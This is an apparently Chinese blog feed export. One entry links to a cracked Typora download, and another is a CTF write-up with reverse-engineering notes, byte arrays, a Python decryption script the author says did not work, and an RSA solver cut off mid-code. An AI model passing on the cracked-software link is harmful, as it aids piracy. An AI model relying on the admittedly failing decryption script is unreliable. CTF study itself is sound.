    <content type="html"><![CDATA[<h1 id="Typora-破解"><a href="#Typora-破解" class="headerlink" title="Typora 破解"></a>Typora 破解</h1><p><a href="https://www.ittel.cn/archives/10903.html">Typora v1.8.10中文破解版+安装教程</a></p><p><a href="https://pan.baidu.com/s/1AXfxqM9KBSp7fvbpkeQ8KA?pwd=9sla">Typora v1.8.10.rar_免费高速下载|百度网盘-分享无限制</a></p><p><img src="/./img/rQYyef3qmlaA_AGC/1731581053059-670adf52-7581-4ea7-8a75-badcc68f9355-186492.png" alt="1731581053059-670adf52-7581-4ea7-8a75-badcc68f9355.png"></p><blockquote><p>更新: 2024-11-14 18:44:32<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/wqayakylxs02a6ok">https://www.yuque.com/chaye-apqbl/vsc85q/wqayakylxs02a6ok</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/%E5%8D%9A%E5%AE%A2/index/"/>
    <url>/2026/01/19/%E5%8D%9A%E5%AE%A2/index/</url>
    
    <content type="html"><![CDATA[<h1 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h1><blockquote><p>更新: 2025-05-28 15:16:58<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/wewaqhukifdwy6em">https://www.yuque.com/chaye-apqbl/vsc85q/wewaqhukifdwy6em</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2025/%E9%99%87%E5%89%91%E6%9D%AF%E6%8A%A5%E5%90%8D/%E5%88%9D%E8%B5%9B/"/>
    <url>/2026/01/19/WP/2025/%E9%99%87%E5%89%91%E6%9D%AF%E6%8A%A5%E5%90%8D/%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h1><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Lesscommon"><a href="#Lesscommon" class="headerlink" title="Lesscommon"></a>Lesscommon</h2><h3 id="去平坦化"><a href="#去平坦化" class="headerlink" title="去平坦化"></a>去平坦化</h3><p>python deflat.py -f 1.exe –addr 0x140001000</p><p><img src="/./img/6dbL2C9B2aDrxufZ/1757124066286-747e18ca-2011-4ec7-b2ef-f38e596720f4-950943.png" alt="1757124066286-747e18ca-2011-4ec7-b2ef-f38e596720f4.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">IDA_14002d420 = [<span class="hljs-number">0x4C</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0xF</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xF5</span>]<br></code></pre></td></tr></table></figure><p>满足v2,v4,v5 成功</p><p><img src="/./img/6dbL2C9B2aDrxufZ/1757124355832-88dc35cb-528c-4c91-845d-ab90d13ee327-836836.png" alt="1757124355832-88dc35cb-528c-4c91-845d-ab90d13ee327.png"></p><p>tea</p><p><img src="/./img/6dbL2C9B2aDrxufZ/1757125310034-34b37719-75de-47cd-9e4e-530b31ba8105-374664.png" alt="1757125310034-34b37719-75de-47cd-9e4e-530b31ba8105.png"></p><p>未跑通解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rotate_left</span>(<span class="hljs-params">val, shift</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    循环左移函数</span><br><span class="hljs-string">    :param val: 要移位的32位无符号整数</span><br><span class="hljs-string">    :param shift: 移位位数</span><br><span class="hljs-string">    :return: 循环左移后的结果</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    shift = shift &amp; <span class="hljs-number">0x1F</span>  <span class="hljs-comment"># 确保移位位数在0-31之间（32位整数的有效移位范围）</span><br>    <span class="hljs-keyword">return</span> ((val &lt;&lt; shift) | (val &gt;&gt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># 初始密钥字节</span><br>    key_bytes = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x01</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x10</span>])<br><br>    <span class="hljs-comment"># 计算密钥字数</span><br>    data_length = <span class="hljs-built_in">len</span>(key_bytes)<br>    v26 = (data_length + <span class="hljs-number">3</span>) // <span class="hljs-number">4</span>  <span class="hljs-comment"># 密钥字数</span><br>    <span class="hljs-keyword">if</span> v26 == <span class="hljs-number">0</span>:<br>        v26 = <span class="hljs-number">1</span><br><br>    <span class="hljs-comment"># 初始化v25数组</span><br>    v25 = [<span class="hljs-number">0</span>] * v26<br><br>    <span class="hljs-comment"># 将密钥字节按小端序组合成字存入v25</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(data_length - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        idx = i // <span class="hljs-number">4</span><br>        v25[idx] = ((v25[idx] &lt;&lt; <span class="hljs-number">8</span>) | key_bytes[i]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br>    <span class="hljs-comment"># 初始化状态数组（子密钥）</span><br>    state_length = v26  <span class="hljs-comment"># 状态数组长度与v25相同</span><br>    state = [<span class="hljs-number">0</span>] * state_length<br>    state[<span class="hljs-number">0</span>] = <span class="hljs-number">0x694CEF8C</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, state_length):<br>        state[j] = (state[j - <span class="hljs-number">1</span>] + <span class="hljs-number">0x54C9C307</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br>    <span class="hljs-comment"># 密钥扩展过程</span><br>    v14 = <span class="hljs-number">0</span><br>    v15 = <span class="hljs-number">0</span><br>    v17 = <span class="hljs-number">0</span><br>    v16 = <span class="hljs-number">0</span><br>    k_1 = <span class="hljs-number">3</span> * <span class="hljs-built_in">max</span>(state_length, v26)  <span class="hljs-comment"># 循环次数</span><br><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k_1):<br>        <span class="hljs-comment"># 第一轮混合</span><br>        state_val = state[v17]<br>        temp = (v14 + v15 + state_val) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v6 = k ^ rotate_left(temp, <span class="hljs-number">3</span>)<br>        state[v17] = v6<br>        v15 = v6<br><br>        <span class="hljs-comment"># 第二轮混合</span><br>        v25_val = v25[v16]<br>        temp2 = (v14 + v15 + v25_val) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        shift_amount = (v6 &amp; <span class="hljs-number">0xFF</span>) + (v14 &amp; <span class="hljs-number">0xFF</span>)<br>        v7 = rotate_left(temp2, shift_amount &amp; <span class="hljs-number">0x1F</span>)<br>        v25[v16] = v7<br>        v14 = v7<br><br>        <span class="hljs-comment"># 更新索引</span><br>        v17 = (v17 + <span class="hljs-number">1</span>) % state_length<br>        v16 = (v16 + <span class="hljs-number">1</span>) % v26<br><br>    <span class="hljs-comment"># 将state作为子密钥用于解密</span><br>    subkeys = state<br><br>    <span class="hljs-comment"># 加密数据</span><br>    enc_data = <span class="hljs-built_in">bytes</span>([<br>        <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xF6</span>,<br>        <span class="hljs-number">0x86</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x10</span>,<br>        <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x34</span>,<br>        <span class="hljs-number">0x43</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x51</span>,<br>        <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x56</span>,<br>        <span class="hljs-number">0x42</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xF5</span><br>    ])<br><br>    <span class="hljs-comment"># 将加密数据分成8字节块</span><br>    blocks = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(enc_data), <span class="hljs-number">8</span>):<br>        blocks.append(enc_data[i:i + <span class="hljs-number">8</span>])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_block</span>(<span class="hljs-params">block, subkeys</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        解密单个数据块</span><br><span class="hljs-string">        :param block: 8字节加密数据块</span><br><span class="hljs-string">        :param subkeys: 子密钥数组</span><br><span class="hljs-string">        :return: 解密后的8字节数据块</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 将8字节块分成左右两部分（各4字节）</span><br>        left = (block[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">24</span>) | (block[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>) | (block[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>) | block[<span class="hljs-number">3</span>]<br>        right = (block[<span class="hljs-number">4</span>] &lt;&lt; <span class="hljs-number">24</span>) | (block[<span class="hljs-number">5</span>] &lt;&lt; <span class="hljs-number">16</span>) | (block[<span class="hljs-number">6</span>] &lt;&lt; <span class="hljs-number">8</span>) | block[<span class="hljs-number">7</span>]<br><br>        <span class="hljs-comment"># 根据子密钥数量调整轮数</span><br>        rounds = <span class="hljs-built_in">min</span>(<span class="hljs-number">12</span>, <span class="hljs-built_in">len</span>(subkeys) // <span class="hljs-number">2</span>)<br><br>        <span class="hljs-comment"># Feistel网络解密（反向操作）</span><br>        <span class="hljs-keyword">for</span> <span class="hljs-built_in">round</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):  <span class="hljs-comment"># 反向轮次</span><br>            sk1 = subkeys[(<span class="hljs-number">2</span> * <span class="hljs-built_in">round</span>) % <span class="hljs-built_in">len</span>(subkeys)]  <span class="hljs-comment"># 第一子密钥</span><br>            sk2 = subkeys[(<span class="hljs-number">2</span> * <span class="hljs-built_in">round</span> + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(subkeys)]  <span class="hljs-comment"># 第二子密钥</span><br><br>            <span class="hljs-comment"># Feistel轮函数操作</span><br>            temp = rotate_left((sk2 + right) &amp; <span class="hljs-number">0xFFFFFFFF</span>, left &amp; <span class="hljs-number">0x1F</span>)<br>            new_left = right ^ temp  <span class="hljs-comment"># 异或操作</span><br><br>            temp2 = rotate_left((sk1 + new_left) &amp; <span class="hljs-number">0xFFFFFFFF</span>, right &amp; <span class="hljs-number">0x1F</span>)<br>            new_right = left ^ temp2  <span class="hljs-comment"># 异或操作</span><br><br>            <span class="hljs-comment"># 更新左右部分</span><br>            left = new_left<br>            right = new_right<br><br>        <span class="hljs-comment"># 最终处理：减去初始子密钥</span><br>        left = (left - subkeys[<span class="hljs-number">0</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        right = (right - subkeys[<span class="hljs-number">1</span> % <span class="hljs-built_in">len</span>(subkeys)]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br>        <span class="hljs-comment"># 将32位整数转换回字节</span><br>        left_bytes = [(left &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (left &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (left &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, left &amp; <span class="hljs-number">0xFF</span>]<br>        right_bytes = [(right &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (right &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (right &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, right &amp; <span class="hljs-number">0xFF</span>]<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(left_bytes + right_bytes)<br><br>    <span class="hljs-comment"># 解密所有数据块</span><br>    decrypted_blocks = []<br>    <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks:<br>        decrypted_blocks.append(decrypt_block(block, subkeys))<br><br>    <span class="hljs-comment"># 合并所有解密后的块</span><br>    decrypted_data = <span class="hljs-string">b&#x27;&#x27;</span>.join(decrypted_blocks)<br><br>    <span class="hljs-comment"># 去除PKCS#7填充</span><br>    padding_len = decrypted_data[-<span class="hljs-number">1</span>]<br>    decrypted_data = decrypted_data[:-padding_len]<br><br>    <span class="hljs-comment"># 输出解密结果</span><br>    <span class="hljs-built_in">print</span>(decrypted_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h2 id="Prover"><a href="#Prover" class="headerlink" title="Prover"></a>Prover</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">IDA_6085 = [<span class="hljs-number">0x3</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xB</span>, <span class="hljs-number">0xD</span>]<br>IDA_608a = [<span class="hljs-number">0xA5</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x21</span>]<br></code></pre></td></tr></table></figure><p>Z3约束求解</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="RSA-iso"><a href="#RSA-iso" class="headerlink" title="RSA.iso"></a>RSA.iso</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br>import re<br><span class="hljs-keyword">from</span> math import gcd<br><br>def <span class="hljs-title function_ invoke__">inv_mod</span>(<span class="hljs-attr">a</span>: <span class="hljs-keyword">int</span>, <span class="hljs-attr">m</span>: <span class="hljs-keyword">int</span>) -&gt; <span class="hljs-keyword">int</span>:<br>    a %= m<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">pow</span>(a, -<span class="hljs-number">1</span>, m)<br><br>def <span class="hljs-title function_ invoke__">long_to_bytes</span>(<span class="hljs-attr">n</span>: <span class="hljs-keyword">int</span>) -&gt; bytes:<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> b<span class="hljs-string">&quot;\x00&quot;</span><br>    out = []<br>    <span class="hljs-keyword">while</span> n:<br>        out.<span class="hljs-title function_ invoke__">append</span>(n &amp; <span class="hljs-number">0xff</span>)<br>        n &gt;&gt;= <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">bytes</span>(<span class="hljs-title function_ invoke__">reversed</span>(out))<br><br><br>txt = <span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>, errors=<span class="hljs-string">&quot;ignore&quot;</span>).<span class="hljs-title function_ invoke__">read</span>()<br>a = <span class="hljs-keyword">int</span>(re.<span class="hljs-title function_ invoke__">search</span>(r<span class="hljs-string">&#x27;a\s*=\s*(\d+)&#x27;</span>, txt).<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>))<br>r = <span class="hljs-keyword">int</span>(re.<span class="hljs-title function_ invoke__">search</span>(r<span class="hljs-string">&#x27;r\s*=\s*(\d+)&#x27;</span>, txt).<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>))<br>n = <span class="hljs-keyword">int</span>(re.<span class="hljs-title function_ invoke__">search</span>(r<span class="hljs-string">&#x27;\bn\s*=\s*(\d+)&#x27;</span>, txt).<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>))<br>c = <span class="hljs-keyword">int</span>(re.<span class="hljs-title function_ invoke__">search</span>(r<span class="hljs-string">&#x27;\bc\s*=\s*(\d+)&#x27;</span>, txt).<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>))<br>e = <span class="hljs-number">65537</span><br><br>pre, giftblock = txt.<span class="hljs-title function_ invoke__">split</span>(<span class="hljs-string">&quot;gift =&quot;</span>, <span class="hljs-number">1</span>)<br><br>def <span class="hljs-title function_ invoke__">parse_fp2_scalar</span>(<span class="hljs-attr">s</span>: str):<br>    s = s.<span class="hljs-title function_ invoke__">strip</span>()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;*i&quot;</span> not in s:<br>        <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>, <span class="hljs-keyword">int</span>(s))<br>    s2 = s.<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-string">&quot;+i&quot;</span>, <span class="hljs-string">&quot;+1*i&quot;</span>).<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-string">&quot;-i&quot;</span>, <span class="hljs-string">&quot;-1*i&quot;</span>)<br>    m = re.<span class="hljs-keyword">match</span>(r<span class="hljs-string">&#x27;^(-?\d+)\*i([+-]?\d+)$&#x27;</span>, s2)<br>    <span class="hljs-keyword">if</span> not m:<br>        raise <span class="hljs-title function_ invoke__">ValueError</span>(f<span class="hljs-string">&quot;无法解析 Fp2 标量: &#123;s&#125;&quot;</span>)<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>(m.<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>)), <span class="hljs-keyword">int</span>(m.<span class="hljs-title function_ invoke__">group</span>(<span 